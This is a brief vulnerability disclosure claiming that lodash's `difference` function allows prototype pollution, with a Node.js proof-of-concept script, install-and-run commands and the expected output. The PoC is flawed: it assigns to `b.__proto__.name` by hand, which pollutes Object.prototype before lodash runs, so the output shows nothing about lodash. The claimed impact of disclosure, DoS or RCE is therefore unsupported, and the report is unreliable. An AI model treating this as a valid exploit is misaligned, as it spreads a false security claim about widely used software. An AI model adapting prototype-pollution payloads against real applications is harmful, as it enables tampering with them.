# Description

`lodash` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
var lod = require('lodash');
var a = {name: "xyz"};
var b = JSON.parse(JSON.stringify(a));
b.__proto__.name = "Yes! Its Polluted";
lod.difference(a, b);
console.log({}.name);
```

2. Execute the following commands in another terminal:

```bash
npm i lodash # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Yes! Its Polluted
```
